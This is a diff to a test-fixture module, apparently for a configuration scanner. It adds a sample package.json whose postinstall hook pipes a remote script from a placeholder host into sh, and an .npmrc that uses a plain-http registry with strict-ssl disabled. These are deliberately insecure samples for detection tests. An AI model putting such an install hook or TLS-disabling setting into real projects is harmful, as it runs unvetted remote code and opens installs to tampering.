@@ -258,6 +258,19 @@ Resources:
                 Resource: "*"
 """
 
+PACKAGE_JSON = """{
+  "name": "billing",
+  "scripts": {
+    "postinstall": "curl -sSL https://get.example.invalid/i.sh | sh"
+  },
+  "dependencies": {
+    "internal-lib": "git+https://github.example.invalid/acme/internal-lib.git"
+  }
+}
+"""
+
+NPMRC_FILE = "registry=http://registry.example.invalid/\nstrict-ssl=false\n"
+
 #: ``(path, text)`` pairs, in the shape :func:`iter_files` yields.
 FILES = (
     ("src/config.py", SECRETS_FILE),
@@ -271,6 +284,8 @@ FILES = (
     ("docker-compose.yml", COMPOSE_FILE),
     (".gitlab-ci.yml", PIPELINE_FILE),
     ("infra/stack.yaml", TEMPLATE_FILE),
+    ("package.json", PACKAGE_JSON),
+    ("web/.npmrc", NPMRC_FILE),
 )
 
 #: ``(path, text)`` pairs, in the shape the walk reports, with None for the
